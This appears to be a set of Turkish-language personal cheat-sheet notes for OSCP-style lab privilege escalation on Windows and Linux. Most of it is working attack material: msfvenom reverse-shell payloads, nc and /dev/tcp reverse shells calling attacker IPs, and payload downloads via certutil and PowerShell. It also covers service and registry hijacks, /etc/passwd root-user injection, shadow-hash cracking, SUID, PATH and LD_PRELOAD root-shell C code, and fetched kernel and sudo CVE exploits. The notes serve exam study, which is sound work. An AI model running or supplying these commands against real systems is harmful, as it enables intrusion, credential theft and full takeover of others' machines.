Zafiyetin mantığı
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
Windows Common Files dizinini okurken ilk önce Common sonra Common Files olarak okur, reverse shell dosyasını Common.exe olarak değiştirip hangi üst dizinde yazma iznimiz varsa dosyayı oraya koyuyoruz. Sonra kalide dinleyici açıp servisi çalıştırdığımızsa root yetkisiyle shell elde ediyoruz.

```
reverse.exeyi oluşturalım
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o Common.exe

C:\\PrivEsc>winPEASany.exe

C:\\Program Files\\Unquoted Path Service dizininde yazma hakkımız olduğunu teyit edelim.
.\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\Unquoted Path Service\\"

reverse.exe yi, dosya isminin ilk kelimesi olan Common ile değiştireceğiz, Common.exe olacak
rename reverse.exe Common.exe

net start unquotedsvc
nc -nlvp 4444
	servisi başlattığımız an buraya system yetkili shell düşer
```

WEAK REGISTRY PERMISSIONS - REGSVC

Bu servisde yine yazma iznimiz varsa çalıştığı binary path yoluna reverse shell yolu verilir, kaliden dinleyici açılıp servis çalıştırılır, sonuç olarak yetki yükseltilmiş olarak shell elde edilmiş olur. Winpeas ile servisin zafiyetli olduğunu görüyoruz.

```
C:\\PrivEsc>winPEASany.exe
# çıktıda şu şekil bir şey olmalı:
	regsvc(Insecure Registry Service)["C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe"] - Manual - Stopped
	[+] Looking if you can modify any service registry()
	HKLM\\system\\currentcontrolset\\services\\regsvc (Interactive [TakeOwnership])

Servisdeki yetkileri kontrol ediyoruz.
RW + INTERACTIVE gördün mü? ➔ oturum açmış kullanıcıların bu registry anahtarına yazma yetkisi olduğunu gösterir.
Yani mevcut kullanıcı, ImagePath gibi değerleri değiştirebilir.
C:\\Users\\user>C:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc
	HKLM\\System\\CurrentControlSet\\Services\\regsvc
			 Medium Mandatory Level (Default) [No-Write-Up]
	RW NT AUTHORITY\\SYSTEM
	     KEY_ALL_ACCESS
	RW BUILTIN\\Administrators
	     KEY_ALL_ACCESS
	**RW NT AUTHORITY\\INTERACTIVE**
	     KEY_ALL_ACCESS

C:\\PrivEsc>reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath -t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe
bu komutun yaptığını registry editör ile açarak daha zahmetsiz bir şekilde yapabiliriz, belirtilen yoldaki imagepath değerini reverse
shell yolu olarak değiştireceğiz.

kali'ye gelelim
nc -nlvp 4444

Windowsa gelelim
net start regsvc

sonrasında kaliye system yetkili shell düşer.
```

FILE PERMISSION SERVICE -filepermsvc

```
Winpeas çalışıtırlır ve servisin üzerine yazılabilir durumda olduğu görülür.

C:\\PrivEsc>winPEASany.exe
	filepermsvc (File Permissions Service)["C:\\Program Files\\File Permissions Service\\filepermservice.exe"] - Manual - Stopped
	File Permissions: Everyone [AllAccess]
	_
	Folder: C:\\Program Files\\Autorun Program
	File: C:\\Program Files\\Autorun Program\\program.exe
	File Perms: Everyone [AllAccess]
	RegPath: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o filepermservice.exe --> bunu windowsa aktarırsın

sc qc filepermsvc

  [SC] QueryServiceConfig SUCCESS
	SERVICE_NAME: filepermsvc
        TYPE               : 10        WIN32_OWN_PROCESS
        START_TYPE         : 3         DEMAND_START
        ERROR_CONTROL      : 1         NORMAL
        BINARY_PATH_NAME   : "C:\\Program Files\\File Permissions Service\\filepermservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

 copy /Y "C:\\Temp\\filepermservice.exe" "C:\\Program Files\\File Permissions Service\\filepermservice.exe"

kali'ye gelelim
nc -nlvp 4444

Windowsa gelelim
net start filepermsvc
```

Exploiting AutoRun Programs - Bu zafiyetin sömürülebilmesi için bizden ayrı bir kullanıcının oturum açması gerekli, onun bilgilerini elde edebilmemiz için, bu da oscp’nin formatında olmadığı için bunu es geçiyoruz. ama senaryo aşağıdaki gibi

```
C:\\PrivEsc>reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
					HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
					SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe
					My Program        REG_SZ           "C:\\Program Files\\Autorun Program\\program.exe" --> kullanacağımız dosya yolu bu

C:\\PrivEsc>accesschk.exe /accepteula -wvu "C:\\Program Files\\Autorun Program\\program.exe"
					AccessChk v4.02 - Check access of files, keys, objects, processes or services
					Copyright (C) 2006-2007 Mark Russinovich
					Sysinternals - www.sysinternals.com

					C:\\Program Files\\Autorun Program\\program.exe
					Medium Mandatory Level (Default) [No-Write-Up]
					RW Everyone
					    FILE_ALL_ACCESS
					RW NT AUTHORITY\\SYSTEM
					    FILE_ALL_ACCESS
					RW BUILTIN\\Administrators
					    FILE_ALL_ACCESS
					RW WIN-QBA94KB3IOF\\Administrator
					    FILE_ALL_ACCESS
					RW BUILTIN\\Users
					    FILE_ALL_ACCESS --> dosyaya normal kullanıcıların full erişimi var, üzerine reverse shell yazabiliriz.

copy reverse.exe "C:\\Program Files\\Autorun Program\\program.exe" /Y
nc -nlvp 4444
sc qc autorun
rdesktop 10.10.134.214 - burda admin kullanıcımız var oturum açıyoruz.
# sonrasında netcate system yetkili shell düşecektir.
```

AlwaysInstallElevated

Windows’ta, MSI (Microsoft Installer) dosyaları sistem ayarları veya yazılımlar kurmak için kullanılır. Normalde bu tür kurulumların admin yetkisiyle yapılması gerekir. Ancak sistemde “AlwaysInstallElevated” politikası aktifse, herhangi bir kullanıcı MSI dosyasıyla SYSTEM yetkilerinde işlem yapabilir. Yani, admin hakları olmayan bir kullanıcı, bu açıklığı kullanarak SYSTEM seviyesinde kod çalıştırabilir. Windows, iki kayıt defteri anahtarını kontrol eder:

**HKCU (Current User):**

HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

**HKLM (Local Machine):**

HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

Eğer her iki anahtar da 1 olarak ayarlanmışsa, sistem her zaman MSI dosyalarını yüksek ayrıcalıklarla çalıştırır.

```
Aşağıdaki her iki key değeri de 0x1 olarak ayarlanmış olmalı.

reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

reverse.exe mizi oluşturalım
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.181.172 LPORT=3333 -f msi -o reverse.msi

kalide http server açalım dosyayı aktarmak için
python2 -m SimpleHTTPServer 90

windows içinde kaliden dosyayı alalım
certutil -urlcache -f `http://10.10.181.172:90/reverse.msi` reverse.msi

kalide netcat açalım
nc -nlvp 3333

windowsta msi dosyamızı sessizce çalıştıralım
msiexec /quiet /qn /i reverse.msi

sonrasında netcate system olarak shell düşecektir.
```

Searching For Passwords In Windows Registry

```
Windows Registry'de HKLM (HKEY_LOCAL_MACHINE) anahtarında "password" kelimesini içeren tüm string (REG_SZ) türündeki değerleri alt anahtarlar dahil arar.
reg query HKLM /f password /t REG_SZ /s

Bu komut, Windows'un winlogon anahtarının içeriğini sorgular. İçinde usernama parola falan olabilir.
reg query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"

senaryo gereği bunları çalıştırdık ve parolayı bulduk labda
winPEASAny.exe windowscreds
winPEASAny.exe filesinfo

sonrasında psexec ile ip ye bağlan
python psexec.py admin@10.10.181.88 cmd.exe
```

SCHEDULED TASKS

```
zamanlanmış görevleri bulma
schtasks /query /fo LIST /v

mesela bu dosya bir zamanlanmış görev C:\\DevTools\\CleanUp.ps1

Dosyanın yetkilerini kontrol edelim, üstüne yazabilirsek yani yetkimiz varsa okey
accesschk.exe /accepteula -quvw user "C:\\DevTools\\CleanUp.ps1"

Yetki var, reverse.exe yi bu dosya üstüne yazalım.
echo C:\\PrivEsc\\reverse.exe >> C:\\DevTools\\CleanUp.ps1   bu olmazsa şunu dene
echo Start-Process "C:\\PrivEsc\\reverse.exe" >> C:\\DevTools\\CleanUp.ps1

Netcat açalım, Task çalışınca system olarak shell düşer
nc -nlvp 4444

Gerekirse görevi elle tetikle
schtasks /run /tn "Görev Adı"
```

Exploiting Insecure GUI Apps

```
task manager (görev yöneticisi) üzerinden admin yetkisiyle çalışan programlar aranır,
programda dizin girilen bir yere varsa, mesela paint için, oraya şu yazılır file://c:/windows/system32/cmd.exe
# Çıkma olasılığı baya düşük
```

UAC BYPASS

```
UACME ARACI İLE

<https://github.com/hfiref0x/UACME>

EXAMPLES

akagi32.exe 23
akagi64.exe 61
akagi32.exe 23 c:\\windows\\system32\\calc.exe
akagi64.exe 61 c:\\windows\\system32\\charmap.exe

MANUEL YÖNTEM - bunu araştır.
```

TOKEN KIDNAPPING LOCAL PRIV ESC

```
<https://www.exploit-db.com/exploits/6705>
exploit için gerekli dosya mevcut <https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip>
bize exe dosyası lazım exe yi direkt indirmek istersen şurdan indirebilirsin. <https://github.com/Re4son/Churrasco/blob/master/churrasco.exe>

dosyayı yükleyelim
SUNUCU WEBDAV DESTEKLİ

curl -X PUT http://10.10.10.15/churrasco.txt --data-binary @churrasco.txt
curl -X MOVE --header 'Destination:http://10.10.10.15/churrasco.exe' 'http://10.10.10.15/churrasco.txt'

dosyayı çalıştıralım

churrasco.exe "cmd /c type \"C:\Documents and Settings\Lakis\Desktop\user.txt\" veya
churrasco.exe "cmd /c type \"C:\Documents and Settings\Lakis\Desktop\user.txt\""

ikinci olan doğru olması lazım ama birinci de çalıştı
```

FILE PERMISSON PRIV ESC

```
Windows icacls Komutları Hızlı Referans

1. İzinleri Görüntüleme
icacls <dosya veya klasör>
Örnek: icacls root.txt
2. Birine Tam Yetki Verme
icacls <dosya> /grant <kullanıcı>:F
Örnek: icacls root.txt /grant alfred:F
3. İzinleri Kaldırma
icacls <dosya> /remove <kullanıcı>
Örnek: icacls root.txt /remove administrator
4. İzinlerin Miras Almasını Kontrol Etme (Inheritance)
icacls <dosya> /inheritance:<seçenek>
Seçenekler:
e – inheritance enabled
d – inheritance disabled
r – remove inheritance
Örnek: icacls root.txt /inheritance:r
5. Birine Okuma Yetkisi Verme
icacls <dosya> /grant <kullanıcı>:R
Örnek: icacls root.txt /grant bob:R
6. Dosya Sahipliğini Değiştirme
takeown /f <dosya>
Örnek: takeown /f root.txt

Temel Yetki Kısaltmaları:
F  : Full Control
M  : Modify
RX : Read & Execute
R  : Read
W  : Write

# 1. Zafiyetli Servisi Tespit Et (Manual veya WinPEAS ile)
# WinPEAS genelde "File Permissions: Everyone [Write|AllAccess]" şeklinde işaretler.
# Manuel kontrol (Servis yolunu ve izinlerini görme):
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
icacls "C:\Path\To\Service.exe"

# 2. Yetkini Kontrol Et
# Eğer çıktı içinde (M) Modify, (W) Write veya (F) Full Control görüyorsan ZAFİYET VARDIR.
# Örnek: BUILTIN\Users:(I)(M) veya Everyone:(F)
icacls "C:\Program Files\Vulnerable Service\service.exe"

# 3. Kendi Reverse Shell'ini Hazırla (LHOST ve LPORT ayarla)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.X LPORT=4444 -f exe -o service.exe

# 4. Orijinal Dosyanın Yedeğini Al (Opsiyonel ama profesyonelce)
move "C:\Path\To\service.exe" "C:\Path\To\service.exe.bak"

# 5. Kendi Dosyanı Hedefe Yükle (Powershell veya Certutil ile)
powershell iwr -uri http://10.10.10.X/service.exe -OutFile "C:\Path\To\service.exe"

# 6. Eğer yetkin varsa servisi durdur ve başlat
# (Yetkin yoksa makinenin restart edilmesini beklemen gerekebilir)
net stop <servis_adı>
net start <servis_adı>

# 7. İzinleri Değiştirmen Gerekiyorsa (Sahipliği alıp yetki verme)
takeown /f "C:\Path\To\service.exe"
icacls "C:\Path\To\service.exe" /grant %username%:F
```

**LINUX ENUMERATION & PRIVILEGE ESCALATION**

```
Linux system enumeration

hostname	        bilgisayar adını verir
uname -a 	        sistem hakkında bilgi verir
cat /proc/version	Linux çekirdek bilgisini verir
cat /etc/issue	  OS ve sürüm bilgisi
lscp	            işlemci bilgisi
ps aux | grep root	               root kullanıcısına ait processleri gösterir.
find / -name id_rsa 2> /dev/null 	 id_rsa dosyasının bulunduğu yerleri verir
locate password	                   parola içeren dosya ve dizinleri verir

Aşağıdaki 2 komut da Linux sisteminde SUID (Set User ID) biti atanmış dosyaları bulur.
find / -perm -4000 -type f
find / -perm -u=s -type f 2>/dev/null
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null 	PASSWORD ifadesini içeren herşeyi arar.
php suid priv esc code =   php -r "pcntl_exec('/bin/sh', ['-p']);"
=============================================================================================================================================================================================
User Enumeration
whoami	            oturum açan kullanıcı adı
id	                kullanıcı user ve group id değerleri
sudo -l	            kullanıcının hangi komutları sudo yetkisiyle çalıştırabileceğini gösterir.
cat /etc/passwd	    hesap listesi ve kullanıcı bilgileri
cat /etc/shadow	    parola hashleri
cat /etc/group	    grup ve gruplara bağlı kullanıcı listesi
sudo su -	          root olarak oturum açtırır.
sudo	              komutları geçici olarak root yetkisiyle çalıştırır.
su	                başka kullanıcıya geçiş yaptırır. kullanımı su <kullanıcı_adı>
sudo su	            root kullanıcısına geçiş yapar
=============================================================================================================================================================================================
NETWORK ENUMERATION
ifconfig	            ağ arayüzlerini gösterir
ip a	                ağ arayüzlerini ve ip adreslerini gösterir.
route	                yönlendirme tablosunu gösterir.
arp -a	              arp tablosunu gösterir.
netstat -ano	        ağ, port ve portlara bağlı pid leri gösterir.
routel	              yine ağ yönledirme tablosunu gösterir.
ls -lah /etc/cron*	  cron ile ilgili zamanlanmış görevleri yani cronjobları ve ilgili dosyaları gösterir.
crontab -l 	          mevcut cron job listesini gösterir.
lsblk	                diskleri listeler
cat /etc/os-release	  os bilgilerini listeler
find / -writable -type d 2>/dev/null	    kullanıcı tarafından yazılabilir tüm dizinleri bulur
cat /etc/fstab:
sistem açıldığında hangi disk bölümlerinin nereye ve nasıl bağlanacağını gösteren yapılandırma dosyasını (/etc/fstab) ekrana yazdırır.
Disklerin otomatik olarak mount edilmesini (bağlanmasını) sağlar.

Yanlış yapılandırılırsa sistem açılmaz.
İçeriğinde genellikle şu bilgiler yer alır:
• Hangi disk (örneğin /dev/sda1)
• Nereye bağlanacak (örneğin /home)
• Dosya sistemi tipi (örneğin ext4, ntfs)
• Mount seçenekleri (örneğin defaults, ro, noauto)

=============================================================================================================================================================================================
AUTOMATED ENUMERATIONS
./linux-exploit-suggestor.sh	<https://github.com/The-Z-Labs/linux-exploit-suggester>

eğer sh dosyası çalışmıyorsa versiyon kontrolü felan varsa aşağıdaki dene 
sed -i 's/exit 1/echo "Skipping check..."/' les.sh
./les.sh

./linpeas.sh 	<https://github.com/peass-ng/PEASS-ng/tree/master>
linpeass linuxda şu konumdadır /usr/share/peass/linpeass
Escalation via stored paswords	cat .bash_hisory
history
history | grep pass
Escalation via shadow file 	cat /etc/shadow  //hash elde edilir.
hashcat -m 1800 creds.txt rockyou.txt -O  //linux ortamı
hashcat64.exe -m 1800 creds.txt rockyou.txt -O  //windows ortamı
su root  //parola elde edildikten sonra girilir root olunur.
Escalation via ssh keys	find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
gedit id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@192.168.4.7
--> root@debian:~#
GTFOBINS	GTFOBins. —> <https://gtfobins.github.io/>
Özellikle OSCP'de sudo -l çıktısını GTFOBins’e atmak, root erişimi için standart taktiktir.
GTFOBins = “Sistemdeki meşru komutlarla nasıl shell/root yetkisi alınır?” sorusunun cevabıdır.

Case 1:
sudo -l   //çıktıda vim gözükür.
sudo vim -c ':!/bin/sh'   // bu komutla root olunur

Case 2:
sudo -l  //çıktıda awk var, sitede awk aranır
sudo awk 'BEGIN {system("/bin/sh")}' // bu komutla root olunur
Escalation via intendent functionality 	sudo -l
//çıktıda apache2 içeren birşey varsa aşağıdaki komutu gir

sudo apache2 -f /etc/shadow
//hashi kırıp root oluyorsun.
SUID OVERVIEW 	suid binary dosyasına sahip program çalıştırıldığında root yetkileriyle çalışır.
suid biti dosya izinlerinde 4. karakter olarak yer alır ve s harfiyle temsil edilir.

-rwsr-xr-x 1 root root 44432 Jan  1 2020 /bin/ping

suid biti içeren örnek programlari passwd, ping, sudo, şu komutla bulunur.
find / -perm -u=s -type f 2>/dev/null
çıktılar gtfobins üzerinden aratılarak gerekli komut dizileri girilerek root olunur
Abusing password authentication 	Senaryo

openssl passwd w00t //şifre hashi oluşturulur
l6zpgl8zi8tp6 //yukarıdaki komutun çıktısı
echo "root2:l6zpgl8zi8tp6:0:0:root:/root:/bin/bash" >> /etc/pass //kullanıcı eklenir
su root2 // eklenen yeni root kullanıcısıyla giriş yapılır.

Bu yöntem, /etc/passwd dosyasına yazma yetkisi olan bir kullanıcı tarafından kullanılarak root yetkisi elde edilmesini sağlıyor.
Normalde, bu dosya yalnızca root tarafından değiştirilebilir olmalıdır. Ancak, eğer sistem yanlış yapılandırılmışsa veya bir güvenlik açığı varsa,
bu yöntemle root erişimi kazanılabilir. Bu tür bir saldırı, misconfigured (yanlış yapılandırılmış) sistemlerde bir privesc (privilege escalation - yetki yükseltme)
tekniği olarak kullanılır. Ancak modern Linux dağıtımlarında /etc/passwd yerine /etc/shadow kullanıldığı için, bu tür bir saldırı genellikle mümkün olmaz.

ls -l /etc/passwd //çıktıda eğer yazma iznin gözüküyorsa zafiyeti sömürürsün
```

Kernel zafiyetleri

```
Searchsploit ile zafiyetler tespit edilip yönergeler izlenerek exploit gerçekleştirilir.
```

CVE 2016-5195 - Dirty cow

```
Etkilenen sürümler: Linux kernel 2.6.22 – 4.8.3 (dahil)
Dirty COW (Copy-On-Write) zafiyeti, Linux çekirdeğinin copy-on-write (COW) mekanizmasındaki bir yarış durumu (race condition) nedeniyle
ortaya çıkar. Normalde sadece okunabilir olan dosyalar, bu bug sayesinde bellekte yazılabilir hâle getirilebilir. Bu sayede: Salt-okunur dosyalar
üzerinde yazma işlemi gerçekleştirilerek sistemde root ayrıcalıkları elde edilebilir.

uname -a
wget <https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c>
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
su firefart //parola firefart
```

CVE 2019-14287 - SUDO < 1.8.28

```
# zafiyet şu sürümlerde geçerlidir. sudo < 1.8.28
Sudo, bir kullanıcıya geçici olarak root gibi başka bir kullanıcının yetkileriyle komut çalıştırma izni verir.
Bu zafiyet, özellikle belirli UID kontrolleri sırasında yanlış davranıştan kaynaklanır. Linux sistemlerde UID 4294967295, sistem tarafından
genellikle root (UID 0) olarak kabul edilir.Bu sayede, saldırgan, sudo komutunu UID -1 ile çalıştırarak aslında root yetkileriyle işlem yapabilir.

sudo -l
sudo -u#-1 /bin/bash
```

CVE-2019-18634 - SUDO < 1.8.26

```
sudo nun versiyona bakarak zafiyetli olup olmadığına bakarsın  1.8.26 öncesi
sudo 1.7.1 → 1.8.25p1 (dahil)
<https://github.com/saleemrashid/sudo-cve-2019-18634>
gcc exploit.c -o exploit
./exploit
```

CVE 2022-0847 - Dirty Pipe

```
<https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits>

Etkilenen Kernel Sürümleri
5.8.0 → 5.16.10
5.15.0 → 5.15.24
5.10.0 → 5.10.101

ilk önce zafiyet var mı yok mu kontrol edelim
<https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker>
./pipe.sh

eğer zafiyetliyse iki çeşit exploit yöntemi var, ikisi de aynı repo içinde, yukarıda verilen

exploit 1
chmod +x compile.sh
./compile.sh

exploit 2
find / -perm -4000 2>/dev/null
//burada birsürü suid değeri geliyor şunu kullanıyoruz. /usr/bin/sudo
./exploit-2 /usr/bin/sudo
```

PATH HIJACKING

```
//Exploit Kodunu Yazıyoruz, bu kodu path_exp.c olarak kaydediyoruz.
---------------------------------------------------------------------------------
#include <stdio.h>   // perror için gerekli
#include <unistd.h>
#include <stdlib.h>

int main() {
    if (setuid(0) == -1 || setgid(0) == -1) {
        perror("UID/GID değiştirilemedi");
        exit(1);
    }
    system("thm"); // "thm" komutunu çalıştır
    return 0;
}

---------------------------------------------------------------------------------
//Derliyoruz ve SUID Bitini Ekliyoruz

gcc path_exp.c -o path
chmod u+s path

//Kodda `system("thm");` var. Yani `path` binary’si çalıştığında, ortamdaki ilk
`thm` isimli komutu çalıştıracak. Nerede arıyor? `$PATH` dizinlerinde! PATH Değişkenini Manipüle Et
export PATH=/tmp:$PATH

//thm Binary’sini Oluştur

echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm

//Dosyayı çalıştır.

./path
whoami
> root
```

CAPABILITIES

```
Aşağıdakiler ile capabilites atanmış dosyalar bulunur, sahipliği kontrol edilir.
getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
**/home/karen/vim = cap_setuid+ep**
/home/ubuntu/view = cap_setuid+ep

ls -l /home/karen/vim
-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim

Bu adımdan sonra root yetkisi elde edilmiş olur.
./vim -c ':py3 import os; os.setuid(0); os.execv("/bin/sh", ["sh"])'
```

```
Capability	            Açıklama

cap_setuid	            UID’yi değiştirmeye izin verir. Root olunabilir.
cap_dac_override	      Dosya erişim kontrollerini atlar.
cap_sys_admin	          Çok geniş yetki verir, genelde root erişimine denk.
cap_net_admin	          Ağ arayüzlerini yönetir.
cap_net_bind_service	  1024 altı portlara erişim sağlar. (tek başına root vermez)Eğer cap_setuid+ep varsa, SUID exploit gibi kullanılabilir.
```

CRONJOB

```
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
		Nov 14 12:20:01 debian-privesc CRON[3226]:
		(root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
		Nov 14 12:21:01 debian-privesc CRON[3293]:
		(root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
		Nov 14 12:22:01 debian-privesc CRON[3330]:
		(root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)

joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
		-rwxrwxrw- 1 root root 50 Aug 25 06:39 /home/joe/.scripts/user_backups.sh

joe@debian-privesc:~$ cd .scripts
joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.168.19.129 1234 >/tmp/f" >> user_backups.sh

kali@kali:~$ nc -lnvp 1234
		listening on [any] 1234 ...
		connect to [1.168.19.129] from (UNKNOWN) [1.168.19.214] 57826
		/bin/sh: 0: can't access tty: job control turned off
		# id
		uid=0(root) gid=0(root) groups=0(root)
		#

pspy aracı ile cronjobları listeleyebilirsin
ÖRNER KULLANIMI

wget `http://192.168.45.222/pspy64`
chmod +x pspy64
./pspy64
```

LD_PRELOAD

```
sudo -l
	(ALL) NOPASSWD: LD_PRELOAD=* /usr/bin/someprogram

nano shell.c
//aşağıdaki kod içine yazılır.
---------------------------------------------------------------------------------
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
---------------------------------------------------------------------------------
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls
	myvpn.ovpn  shell.c  shell.so  tools
sudo LD_PRELOAD=shell.so apache2
sudo LD_PRELOAD=/home/user/shell.so apache2
```

NFS

```
# 1. NFS paylaşımlarının detaylarını öğrenmek için (sunucuda erişimin varsa)
Paylaşımda no_root_squash aktif ve writable olmalı (hedef sistemde çalıştır)
cat /etc/exports

# 2. NFS paylaşımlarını göster (kendinde)
showmount -e 10.10.10.5

# 3. Mount et (tercih edilen, kendinde)
mkdir -p /tmp/nfs
mount -t nfs -o rw 10.10.10.5:/var/www/html /tmp/nfs
# alternatif mount komutları
mount -t nfs 10.10.10.5:/var/www/html /tmp/nfs
mount -t nfs -o rw 10.0.2.12:/backups /tmp/backupsonattackermachine

# 4. İzinleri kontrol et (kendinde )
ls -la /tmp/nfs

# 5. Reverse shell scripti oluştur (kendinde )
echo -e '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/nfs/reverse_shell.sh
chmod +x /tmp/nfs/reverse_shell.s

# 6. SUID shell oluştur (kendinde)
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
ls -l /tmp/nfs/bash

# (Hedef sistemde shell aldıktan sonra NFS mount noktasına git, örn: /mnt/nfs)
/mnt/nfs/bash -p   # Root shell almak için
id                 # Yetkini kontrol et

# 7. nfs.c dosyasını oluştur ve derle (kendi ortamda)
---------------------------------------------------------------------------------
#include <stdlib.h>
#include <unistd.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
---------------------------------------------------------------------------------
(kendi ortamında)
gcc nfs.c -o nfs -w
chmod +s nfs
ls -l nfs
./nfs
```

SUDO

```jsx
case 1: bütün komutları root olarak çalıştırmaya yetkin vardır
				ALL: ALL ALL
sudo -l
sudo su

case 2:
sudo -l  --> çıkan sonuçlar gtfobins sitesinde sudo altında aranır, çıkan komutlar girildikten sonra root olursun,

case 3:
find / -perm -u=s -type f 2>/dev/null  //bu komutda da çıkan şeyler gtfobins altında suid altında aranır

Komut	                         Ne Yapar?	                                            GTFOBins Sekmesi	 Amaç
sudo -l	                       Şifresiz çalıştırılabilecek sudo komutlarını listeler	sudo	             Root yetkili komutları kötüye kullanmak
find / -perm -u=s -type f	     SUID bitli root binary'leri listeler	                  suid	             Privilege escalation
find / -writable -type d	     Yazılabilir dizin bulur	                                                 Lateral movement, exploit persistenc
```

winpeas komutları

```
winPEAS.exe userinfo
winPEAS.exe quiet > output.txt
winPEAS.exe quiet | findstr /I "service"
```

runas komutları

```
PS> runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.197 443"
```

hash identifier

```
┌──(root㉿kali)-[~]
└─# hash-identifier
alt satırda hash girersin sana tipini söyler.
```

PUTTY

```
PS> reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
```

KONUM - PATHS

```
mimikatz konumu /usr/share/windows-resources/mimikatz/x64 konumundadır.
php-reverse-shell.php, /usr/share/webshells/php/php-reverse-shell.php konumundadır
nc.exe, /usr/share/windows-resources/binaries/ konumundadır.
```

wpscan

```jsx
Token almak için <https://wpscan.com/profile>
• wpscan --url <https://example.com/> --random-user-agent
• wpscan --url <https://example.com/> --api-token YOUR_API_TOKEN
• wpscan --url <https://example.com/> --api-token YOUR_API_TOKEN -eu
• wpscan --url <https://example.com/> --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
• wpscan --url <https://example.com/> --api-token YOUR_API_TOKEN --disable-tls-checks -eu
```

Responder

```jsx
Eğer responderı çalıştırdığında hata verirse address already in use gibi, şunları yap
pgrep -a -f Responder || pgrep -a -f responder || pgrep -a -f Responder.py

bunun çıktılarındaki process id leri kill -9 pid şeklinde öldür şu şekilde tekrar çalıştır
sudo responder -I tun0 -wv
```

bash ile açık olan ipleri pingleme ve bulma

```jsx
for i in $(seq 1 255); do ping -c 1 192.168.110.$i &>/dev/null && echo 192.168.110.$i; done
```

```jsx
BAZI SORUNLAR VE ÇÖZÜMLERİ

bir netcat listener açtın ve reverse shell payload oluşturdun diyelim, eğer reverse shelli çalıştıdğında netcat listener üzerinde shell düşmüyorsa muhtemelen oluşturduğun payload sıkıntılı

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o reverseshell2.exe --> bu netcat uyumludur, bunu kullan
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o reverseshell.exe --> bu netcat ile çalışmaz msfconsole üzerinde listener açarsan çalışır

CMD üzerinde exe çalıştırma şekilleri
.\\payload.exe.    ters slash kullan
payload.exe.      slash kullanmadan çalıştır.
powershell üzerinde exe çalıştırma şekilleri

.\\payload.exe
./payload.exe
```

```jsx
RUNAS KOMUTLARI
runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.197 443"
runas /user:svc_mssql "nc.exe -e cmd.exe 192.168.45.182 443"
```

runas komutarı için ayrı başlık yap

```jsx
örnek 
runas /user:Administrator "nc.exe -e cmd.exe 192.168.45.215 443" 
```

how to create virtual environment - önemli sınavda lazım olabilir

```jsx
python3 -m venv salt-env
#change salt-env to whatever name you wish
source salt-env/bin/activate
```

ping geliyor mu kontrolü

```jsx
ping $IP
sudo tcpdump -i eth0 icmp
```

```jsx
herhangi bir powershell scriptini çalıştıramadığında şunları sırasıyla dene, biri olmazsa diğeri çalıştırır. 

1) powershell -ep bypass      
2) Set-ExecutionPolicy Bypass -Scope Proces
```

```jsx
nc.exe ile reverse shell 
